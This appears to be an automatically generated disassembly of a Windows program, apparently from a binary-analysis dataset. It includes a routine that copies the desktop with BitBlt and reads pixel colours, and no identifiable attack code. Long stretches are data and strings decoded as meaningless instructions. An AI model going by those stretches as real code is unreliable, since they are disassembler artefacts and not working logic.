call sub_41725c
mov eax [ ebp - 0x6c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x68 ]
mov [ ebp - 0x10 ] eax
lea edx [ ebp - 0x3c ]
mov ecx 0x5
mov eax esi
call sub_4251e0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4032a8
retn
mov eax [ esi + 0x10 ]
mov edx 0xffffff
call sub_424990
lea ecx [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
dec edx
mov eax [ ebp - 0x8 ]
dec eax
call sub_41725c
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xa4 ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0xa0 ] eax
lea ecx [ ebp - 0x4c ]
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0x4 ]
call sub_41725c
mov eax [ ebp - 0x4c ]
mov [ ebp - 0x9c ] eax
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x98 ] eax
lea ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x4 ]
inc edx
mov eax [ ebp - 0x8 ]
call sub_41725c
mov eax [ ebp - 0x54 ]
mov [ ebp - 0x94 ] eax
mov eax [ ebp - 0x50 ]
mov [ ebp - 0x90 ] eax
lea ecx [ ebp - 0x5c ]
mov edx [ ebp - 0x4 ]
add edx ebx
inc edx
mov eax [ ebp - 0x8 ]
add eax ebx
call sub_41725c
mov eax [ ebp - 0x5c ]
mov [ ebp - 0x8c ] eax
mov eax [ ebp - 0x58 ]
mov [ ebp - 0x88 ] eax
lea ecx [ ebp - 0x64 ]
mov edx [ ebp - 0x4 ]
sub edx ebx
mov eax edi
add eax [ ebp - 0x8 ]
add eax ebx
inc eax
call sub_41725c
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x84 ] eax
mov eax [ ebp - 0x60 ]
mov [ ebp - 0x80 ] eax
lea ecx [ ebp - 0x6c ]
mov edx [ ebp - 0x4 ]
sub edx ebx
dec edx
mov eax edi
add eax [ ebp - 0x8 ]
add eax ebx
inc eax
call sub_41725c
mov eax [ ebp - 0x6c ]
mov [ ebp - 0x7c ] eax
mov eax [ ebp - 0x68 ]
mov [ ebp - 0x78 ] eax
lea ecx [ ebp - 0xac ]
mov edx [ ebp - 0x4 ]
sub edx ebx
sub edx 0x2
mov eax edi
add eax [ ebp - 0x8 ]
add eax ebx
inc eax
call sub_41725c
mov eax [ ebp - 0xac ]
mov [ ebp - 0x74 ] eax
mov eax [ ebp - 0xa8 ]
mov [ ebp - 0x70 ] eax
lea edx [ ebp - 0xa4 ]
mov ecx 0x6
mov eax esi
call sub_4251e0
sub_46f208
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46f22d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f234
retn
sub_46f238
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_406064
xor edx edx
mov [ eax + 0x1c ] edx
call sub_406064
xor edx edx
mov [ eax + 0x20 ] edx
call sub_406064
xor edx edx
mov [ eax + 0x24 ] edx
call sub_406064
xor edx edx
mov [ eax + 0x28 ] edx
call sub_406064
xor edx edx
mov [ eax + 0x2c ] edx
call sub_406064
xor edx edx
mov [ eax + 0x30 ] edx
call sub_406064
xor edx edx
mov [ eax + 0x34 ] edx
call sub_406064
xor edx edx
mov [ eax + 0x38 ] edx
call sub_406064
xor edx edx
mov [ eax + 0x3c ] edx
sub_46f2c9
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
inc esi
add ah bl
inc esi
add [ eax ] bh
add al [ eax ]
add [ esp + ecx * 4 + 0x44 ] ch
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0xc300040 ] al
inc ebp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add ah bh
hlt
sub_46f4b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x2c ]
mov al [ ebp + 0x8 ]
mov [ ebx + 0x234 ] al
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_46f4fc
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x230 ]
call sub_4032a8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_454ddc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_46f52c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44ff44
cmp [ esi + 0x190 ] 0x0
je r-xdata
mov [ ebx + 0x24 ] 0x809
or [ ebx + 0x8 ] 0x8
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
and eax 0xbfffffff
or eax 0x80000000
or eax 0x0
mov [ ebx + 0x4 ] eax
sub_46f568
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44bd1c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x22c ]
jne r-xdata
xor eax eax
mov [ edi + 0x22c ] eax
xor edx edx
mov eax edi
call sub_44c794
sub_46f5a0
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_454ed8
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_417298
mov edx esp
mov ecx [ ebx + 0x230 ]
mov eax [ ebx + 0x208 ]
call sub_425274
add esp 0x10
pop ebx
retn
sub_46f5dc
push ebx
push esi
add esp 0xffffffe8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x22c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x22c ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_421248
add esp 0x18
pop esi
pop ebx
retn
mov edx ebx
call sub_421018
lea edx [ esp + 0x8 ]
mov eax [ ebx + 0x22c ]
call sub_44c214
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov esi [ ebx + 0x22c ]
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_44cd9c
mov al [ ebx + 0x234 ]
sub al 0x1
jb r-xdata
lea edx [ esp + 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x8 ]
mov ecx esp
mov eax esi
call sub_44c38c
push 0x4
mov eax [ ebx + 0x22c ]
mov edx [ eax + 0x4c ]
sub edx 0x4
push edx
mov ecx [ esp + 0xc ]
add ecx 0x4
mov edx [ eax + 0x48 ]
add edx [ esp + 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
jmp r-xdata
je r-xdata
mov eax ebx
call sub_44cda4
mov eax [ ebx + 0x22c ]
mov edx [ eax + 0x48 ]
push edx
push 0x4
mov ecx [ eax + 0x4c ]
add ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
add edx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
jmp r-xdata
sub_46f6c8
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov cx [ eax + 0x218 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x214 ]
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov bx [ ebx + 0x216 ]
add bx dx
mov edx ebx
call sub_46e918
mov ebx eax
mov eax ebx
call sub_406d20
mov [ esi ] al
mov eax ebx
call sub_406d1c
mov [ esi + 0x1 ] al
mov eax ebx
call sub_406d18
mov [ esi + 0x2 ] al
pop esi
pop ebx
pop ebp
retn
sub_46f724
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x220 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_46e4e4
mov ax [ esi ]
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x224 ] ax
mov ax [ edi ]
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x228 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax ]
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x226 ] ax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x220 ] ebx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x224 ]
mov [ esi ] ax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x228 ]
mov [ edi ] ax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x226 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_46f7c8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_452aa4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x48 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x230 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x230 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
call GetDesktopWindow
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46f894
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xcc0020
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x230 ]
call sub_429e14
call sub_425570
push eax
call BitBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f89b
mov eax [ ebp - 0x8 ]
push eax
call GetDesktopWindow
push eax
call ReleaseDC
retn
sub_46f89b
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x234 ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
test eax eax
jl r-xdata
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
inc eax
mov [ ebp - 0x10 ] eax
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
test eax eax
jl r-xdata
jmp r-xdata
inc esi
dec [ ebp - 0x10 ]
jne r-xdata
inc edi
xor ebx ebx
inc eax
mov [ ebp - 0x10 ] eax
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x230 ]
mov edx esi
call sub_429f84
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x48 ]
dec edi
test edi edi
jl r-xdata
jmp r-xdata
inc ebx
dec edi
jne r-xdata
lea eax [ ebx + ebx * 2 ]
mov edx [ ebp - 0xc ]
lea eax [ edx + eax ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov cl [ eax ]
mov eax [ ebp - 0x14 ]
mov dl [ eax + 0x1 ]
mov eax [ ebp - 0x14 ]
mov al [ eax + 0x2 ]
call sub_406cfc
mov edx [ ebp - 0x4 ]
mov [ edx + 0x210 ] eax
push ebp
mov eax [ ebp - 0x4 ]
add eax 0x218
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x216 ]
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x214 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_46f724
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x216 ] 0x3a
jb r-xdata
inc esi
dec [ ebp - 0x10 ]
jne r-xdata
inc edi
mov eax esi
sub eax ebx
js r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp esi eax
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x230 ]
mov edx esi
call sub_429f84
mov [ ebp - 0xc ] eax
mov ebx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x48 ]
dec edi
sub edi esi
sub edi ebx
jl r-xdata
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
cmp ebx eax
jg r-xdata
mov edx [ ebp - 0x4 ]
cmp esi [ edx + 0x4c ]
jl r-xdata
push ebp
mov edx ebx
shl edx 0x4
sub edx ebx
add edx 0xffffffc6
sub eax esi
add eax eax
lea eax [ eax + eax * 4 ]
add edx eax
push edx
lea eax [ ebx + ebx * 2 ]
mov edx [ ebp - 0xc ]
lea eax [ edx + eax ]
pop edx
call sub_46f6c8
pop ecx
jmp r-xdata
lea eax [ ebx + ebx * 2 ]
mov edx [ ebp - 0xc ]
lea eax [ edx + eax ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov cl [ eax ]
mov eax [ ebp - 0x18 ]
mov dl [ eax + 0x1 ]
mov eax [ ebp - 0x18 ]
mov al [ eax + 0x2 ]
call sub_406cfc
mov edx [ ebp - 0x4 ]
mov [ edx + 0x210 ] eax
push ebp
mov eax [ ebp - 0x4 ]
add eax 0x218
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x216 ]
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x214 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_46f724
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x216 ] 0x3a
jb r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
sub edx eax
cmp ebx edx
jl r-xdata
push ebp
mov edx esi
shl edx 0x4
sub edx esi
add edx 0xffffffc6
sub eax ebx
add eax eax
lea eax [ eax + eax * 4 ]
add edx eax
push edx
lea eax [ ebx + ebx * 2 ]
mov edx [ ebp - 0xc ]
lea eax [ edx + eax ]
pop edx
call sub_46f6c8
pop ecx
jmp r-xdata
push ebp
lea eax [ ebx + ebx * 2 ]
mov edx [ ebp - 0xc ]
lea eax [ edx + eax ]
mov edx ebx
shl edx 0x4
sub edx ebx
add edx 0xffffffc6
call sub_46f6c8
pop ecx
push ebp
sub eax ebx
mov edx eax
shl eax 0x4
sub eax edx
mov edx 0xffffffc6
sub edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
sub eax 0x8
sub eax esi
mov ecx eax
shl eax 0x4
sub eax ecx
sub edx eax
push edx
lea eax [ ebx + ebx * 2 ]
mov edx [ ebp - 0xc ]
lea eax [ edx + eax ]
pop edx
call sub_46f6c8
pop ecx
jmp r-xdata
push ebp
lea eax [ ebx + ebx * 2 ]
mov edx [ ebp - 0xc ]
lea eax [ edx + eax ]
mov edx esi
shl edx 0x4
sub edx esi
add edx 0xffffffc6
call sub_46f6c8
pop ecx
push ebp
sub eax esi
mov edx eax
shl eax 0x4
sub eax edx
mov edx 0xffffffc6
sub edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
sub eax 0x8
sub eax ebx
mov ecx eax
shl eax 0x4
sub eax ecx
sub edx eax
push edx
lea eax [ ebx + ebx * 2 ]
mov edx [ ebp - 0xc ]
lea eax [ edx + eax ]
pop edx
call sub_46f6c8
pop ecx
jmp r-xdata
sub_46fb50
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46fb75
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46fb7c
retn
sub_46fb90
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46fbb5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46fbbc
retn
sub_46fd7d
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480e0008 ] al
outsd
je r-xdata
outsd
insb
outsd
jb r-xdata
adc [ esi + 0x72 ] eax
popad
outsd
outsb
je r-xdata
inc ebx
inc edx
add [ eax + eax ] dl
call [ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push cs
je r-xdata
inc esi
jb r-xdata
outsd
push ebx
push 0x776f6461
inc ebx
inc edx
add [ eax + eax ] cl
dec [ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax + eax ] 0x0
inc [ esi ]
add [ edx ] dl
inc esp
imul esi [ ebx + 0x61 ] 0x64656c62
or eax [ eax ]
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0xffffff ] al
adc [ eax ] eax
adc [ edx + 0x74 ] al
outsb
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
inc ebx
outsd
insd
push edx
add [ 0x6d617246 ] dl
inc edx
outsd
je r-xdata
outsb
outsb
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e6e4974
jb r-xdata
insd
push esp
outsd
jo r-xdata
pop es
add [ ecx ] cl
inc esi
outsd
outsb
je r-xdata
or [ ebp + 0x65 ] ecx
outsb
jne r-xdata
inc edx
add [ eax + eax ] dh
push [ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0xbff0000 ] 0x0
inc edx
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ eax - 0x37ffb80a ] ah
test [ edi ] sub_47f830
mov eax 0xb0046ff
inc edx
add [ eax ] al
add bh bh
xor [ eax ] al
add dh bh
add [ eax ] eax
add [ eax ] al
push 0x776f6461
and [ esi ] 0x42
add [ eax ] dl
add bh bh
xor al 0x0
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
or [ edx + 0xd007a86 ] 0x0
adc [ esi + 0x72 ] eax
popad
insd
push esp
outsd
jo r-xdata
outsd
insb
outsd
jb r-xdata
inc esi
outsd
outsb
je r-xdata
popad
bound ebp [ ebp + 0x64 ]
inc edx
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] ah
or al [ eax ]
or al 0x48
test [ eax ] al
add bh bh
test [ eax ] al
inc edx
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh 0xd3
out dx eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x7a868a ] al
lldt [ 0x6d617246 ]
inc edx
add [ eax + eax + 0x84ff00 ] al
je r-xdata
dec eax
outsd
inc edx
add [ eax + eax ] bh
add [ eax ] ah
or [ eax ] eax
or [ eax + 0x6f ] cl
outsd
insb
outsd
jb r-xdata
ja r-xdata
popad
jo r-xdata
push esp
pop eax
push eax
inc ebx
outsd
insb
outsd
jb r-xdata
inc esi
add [ ebx ] cl
inc edx
inc edx
outsd
je r-xdata
mov al [ esi + 0xf007a ]
adc eax 0x6d617246
je r-xdata
imul esp [ edi + 0x68 ] 0x6867696c
je r-xdata
or [ eax ] al
push cs
dec eax
inc edx
add [ eax ] bh
add bh bh
js r-xdata
add [ edx ] dl
add [ 0x656c6553 ] cl
shr edi cl
outsd
insd
push edx
imul esp [ edi + 0x68 ] 0x74754f74
jne r-xdata
inc edx
add [ eax + eax ] ah
outsd
jb r-xdata
inc edx
bound ebp [ ebp + 0x64 ]
inc ebx
outsd
insb
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax - 0xfffff1 ] al
cld
inc esi
add [ edi ] al
or edx [ eax + ebx * 2 + 0x50 ]
inc ebx
outsd
insb
outsd
jb r-xdata
add [ 0x6e746341 ] cl
inc ebx
outsd
insb
outsd
jb r-xdata
inc edx
inc esi
jb r-xdata
jne r-xdata
or al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xffffff ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc edx
add [ eax ] bh
add [ eax ] al
arpl [ ebp + 0x64 ] si
inc ebx
outsd
insb
outsd
jb r-xdata
jb r-xdata
add eax [ eax ]
add eax 0x6f6c6f43
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add bh bh
popad
jo r-xdata
add [ edi + esi * 8 ] bl
inc edi
add [ eax + eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4008080 ] 0x0
or eax 0x61736944
inc edx
popad
jo r-xdata
add [ eax + eax ] ch
[ eax + eax ]
bound ebp [ ebp + 0x64 ]
inc esi
outsd
outsb
je r-xdata
outsd
insb
outsd
jb r-xdata
insd
add [ eax + 0xc66931 ] al
adc [ eax ] al
or eax 0x466e7442
jb r-xdata
jb r-xdata
cld
inc esi
add [ eax + 0x160047ae ] al
add [ eax ] cl
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ ecx ] 0x0
add bh bh
add eax 0x69441100
jae r-xdata
adc al 0x0
and [ esi ] 0x42
add [ eax ] bl
add bh bh
pop eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ 0x2ff0000 ] 0x0
or edx [ ebx + 0x68 ]
popad
outsd
add [ eax - 0xfffff8 ] al
outsd
insb
outsd
jb r-xdata
jmp [ eax + eax ]
insd
inc ebx
outsd
insb
outsd
jb r-xdata
insb
outsd
jb r-xdata
inc edx
add [ eax - 0x7f010000 ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc [ eax ]
inc edx
add [ eax + eax ] dh
add bh bh
xor al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
sub_470070
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_470095
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47009c
retn
sub_4700ac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x2
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
add [ edi ] eax
sbb al [ edx ]
inc edi
add [ eax - 0x2fffffff ] dh
mov al 0x47
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi - 0x2327ffc0 ] al
inc esp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add al al
dec eax
add [ eax - 0x4fffbb17 ] bh
fld [ eax + eax + 0x24 ]
pop [ ecx ]
dec esp
push cs
inc edi
add [ edi * 4 - 0x4377ffbc ] bl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ eax + 0xc ] dl
inc edi
add [ eax - 0x28 ] cl
inc esp
add [ eax + ebx * 8 + 0x44 ] al
add [ ecx + ebx * 8 ] dl
inc esp
add [ eax + eax * 2 - 0x3d03ffb8 ] bl
inc esp
add [ eax - 0x3e ] ah
inc esp
add [ eax - 0x27ffbb35 ] cl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
sub_4701f4
inc edi
add ah dl
push cs
inc edi
add [ eax + 0xf ] dh
inc edi
add [ eax + 0x20004712 ] dl
adc eax [ edi ]
ror [ edi + eax * 2 ] 0x1
add ah ch
or al 0x47
add [ eax + 0xd ] cl
inc edi
add [ ebp + ecx + 0xcb80047 ] cl
inc edi
add [ esp + edx * 2 ] dl
inc ebx
jne r-xdata
inc eax
je r-xdata
add [ eax + edx ] cl
cld
xor al 0x40
insd
inc edx
jne r-xdata
inc esp
xor eax 0xdcd80040
je r-xdata
inc edx
add [ esi - 0x2327ffc0 ] al
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ ebx + edx - 0x1647ffb9 ] bh
inc esp
add [ eax + 0x240044dd ] dh
outsd
insb
nop
xor al 0x2
inc edi
add [ edi ] al
adc al 0x54
inc ebx
jne r-xdata
jmp 0xffffffffddf702f6
je r-xdata
pop [ ecx ]
dec esp
push cs
add [ eax - 0x4fffbb17 ] bh
insd
inc edx
jne r-xdata
add [ edi * 4 - 0x4377ffbc ] bl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ ebx + edx ] ch
inc edi
add [ eax - 0x28 ] cl
inc esp
add [ eax + ebx * 8 + 0x44 ] al
add [ ecx + ebx * 8 ] dl
inc esp
add [ eax + eax * 2 - 0x3d03ffb8 ] bl
inc esp
add [ eax - 0x3e ] ah
inc esp
add [ eax - 0x27ffbb35 ] cl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
and al 0x8f
inc ecx
add [ esi + ecx + 0x47 ] cl
je r-xdata
fld [ eax + eax + 0x24 ]
outsb
inc ebx
outsd
outsb
je r-xdata
inc edi
outsd
insb
hlt
sub_470425
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi - 0x2327ffc0 ] al
inc esp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ ebx + edx - 0x1647ffb9 ] bh
inc esp
add [ eax + 0x240044dd ] dh
pop [ ecx ]
dec esp
push cs
inc edi
add [ edi * 4 - 0x4377ffbc ] bl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ esi + edx + 0x47 ] bl
add [ eax - 0x28 ] cl
inc esp
add [ eax + ebx * 8 + 0x44 ] al
add [ ecx + ebx * 8 ] dl
inc esp
add [ eax + eax * 2 - 0x3d03ffb8 ] bl
inc esp
add [ eax - 0x3e ] ah
inc esp
add [ eax - 0x27ffbb35 ] cl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
sub_470634
or cl cl
inc esp
add [ ebx + ebx * 8 + 0x44 ] al
add [ eax + eax * 2 - 0x32b7ffb8 ] dh
inc esp
add ah dh
int 0x44
add [ edx + edx ] ah
inc edi
add ah dl
int 0x44
add [ eax + 0x1a ] ah
inc edi
add al ah
daa
dec eax
add al dh
inc edx
dec eax
add ah dh
aas
dec eax
add [ eax + 0xe ] cl
inc edi
add al cl
cmp ecx [ eax ]
mov [ eax + ecx * 2 ] gs
add al cl
adc al [ edi ]
loopne r-xdata
add ah dh
aaa
dec eax
add [ eax + 0x40 ] ah
dec eax
add ah cl
xor ecx [ eax ]
loopne r-xdata
inc edi
add [ edx + esi + 0x32f40048 ] al
dec eax
add [ eax + 0x30 ] bl
dec eax
je r-xdata
dec eax
add [ edi + esi + 0x111c0048 ] ch
inc edi
add [ eax - 0x23ffb8ee ] dh
adc [ edi ] eax
rcl [ edi ] 0x47
add [ eax + 0x3b ] ah
dec eax
add [ eax + ebx ] dl
inc edi
add [ ecx + ebx + 0x47 ] bh
add [ eax + ebx + 0x47 ] bh
add [ ebx ] al
add [ eax + esi * 4 ] dl
aad 0xff
jmp r-xdata
inc ebx
insd
inc esp
jb r-xdata
inc [ eax ]
sbb [ edi ] al
mov al 0x19
